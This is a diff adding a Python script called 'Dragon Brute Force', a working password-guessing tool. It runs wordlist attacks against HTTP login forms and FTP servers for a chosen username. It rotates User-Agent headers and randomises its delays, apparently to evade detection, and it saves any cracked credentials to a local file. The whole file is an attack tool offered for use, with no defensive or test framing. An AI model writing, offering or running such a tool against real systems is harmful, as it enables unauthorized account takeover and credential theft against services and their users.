@@ -1,0 +1,140 @@
+#!/usr/bin/env python3 
+import argparse
+import random
+import time
+import requests
+import ftplib
+import logging
+from colorama import *
+
+init(autoreset=False)
+
+# User-Agent list
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (Linux; Android 11; SM-G975F)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)",
+    "Mozilla/5.0 (Windows NT 10.0; rv:91.0)",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:90.0)",
+    "Mozilla/5.0 (Linux; Android 10; MI 9)",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)"
+]
+
+# ASCII Dragon Art
+def display_ascii():
+    print(f"""{Fore.RED+Style.BRIGHT}
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
+⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
+⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
+⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
+⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
+⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
+⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
+⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
+⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
+⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
+⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
+⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠂⠂⠒⠀⠒⠐⠂⠂⠀⠀⠀⠀⠀⠀⠀⠀
+        {Style.RESET_ALL}
+        {Fore.RED}DRAGON{Fore.RESET} {Fore.YELLOW}BRUTE FORCE{Fore.RESET}
+    """)
+
+# Load wordlist
+def load_wordlist(file_path):
+    try:
+        with open(file_path, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        print(f"[ERROR] Wordlist file not found: {file_path}")
+        return []
+
+# HTTP Brute Force
+def http_brute_force(target_url, username, wordlist, delay, timeout, max_attempts):
+    print(f"[INFO] Starting HTTP brute force on: {target_url}")
+    session = requests.Session()
+    for index, password in enumerate(wordlist):
+        if index >= max_attempts:
+            print("[INFO] Reached max attempts. Stopping brute force.")
+            break
+
+        # Rotate User-Agent
+        headers = {"User-Agent": random.choice(user_agents)}
+        data = {"username": username, "password": password}
+
+        try:
+            response = session.post(target_url, data=data, headers=headers, timeout=timeout)
+            if response.status_code == 200:
+                print(f"[SUCCESS] Login successful: {username}:{password}")
+                with open("successful_logins.txt", "a") as log_file:
+                    log_file.write(f"{username}:{password}\n")
+                break
+            else:
+                print(f"[FAILED] {username}:{password} | Status Code: {response.status_code}")
+        except Exception as e:
+            print(f"[ERROR] Connection error: {e}")
+
+        time.sleep(random.uniform(0, delay))  # Random delay
+
+# FTP Brute Force
+def ftp_brute_force(target_host, username, wordlist, delay, timeout, max_attempts):
+    print(f"[INFO] Starting FTP brute force on: {target_host}")
+    for index, password in enumerate(wordlist):
+        if index >= max_attempts:
+            print("[INFO] Reached max attempts. Stopping brute force.")
+            break
+
+        try:
+            ftp = ftplib.FTP(timeout=timeout)
+            ftp.connect(target_host)
+            ftp.login(username, password)
+            print(f"[SUCCESS] Login successful: {username}:{password}")
+            with open("successful_logins.txt", "a") as log_file:
+                log_file.write(f"{username}:{password}\n")
+            ftp.quit()
+            break
+        except ftplib.error_perm:
+            print(f"[FAILED] {username}:{password}")
+        except Exception as e:
+            print(f"[ERROR] FTP connection error: {e}")
+
+        time.sleep(random.uniform(0, delay))  # Random delay
+
+display_ascii()
+# Main Function
+def main():
+    parser = argparse.ArgumentParser(description="Dragon Brute Force Tool")
+    parser.add_argument("-p", "--protocol", required=True, choices=["http", "ftp"], help="Protocol to use (http/ftp)")
+    parser.add_argument("-t", "--target", required=True, help="Target URL or IP address")
+    parser.add_argument("-u", "--username", required=True, help="Username for brute force")
+    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
+    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests (default: 1 second)")
+    parser.add_argument("--timeout", type=int, default=10, help="Timeout for each request (default: 10 seconds)")
+    parser.add_argument("--max-attempts", type=int, default=100, help="Maximum number of brute force attempts")
+    parser.add_argument("--silent", action="store_true", help="Suppress all output (silent mode)")
+    
+    args = parser.parse_args()
+
+    # Display ASCII art
+    if not args.silent:
+        display_ascii()
+
+    # Load wordlist
+    wordlist = load_wordlist(args.wordlist)
+    if not wordlist:
+        print("[ERROR] Wordlist is empty or not found. Exiting.")
+        return
+
+    # Start brute force
+    if args.protocol == "http":
+        http_brute_force(args.target, args.username, wordlist, args.delay, args.timeout, args.max_attempts)
+    elif args.protocol == "ftp":
+        ftp_brute_force(args.target, args.username, wordlist, args.delay, args.timeout, args.max_attempts)
+
+if __name__ == "__main__":
+    main()
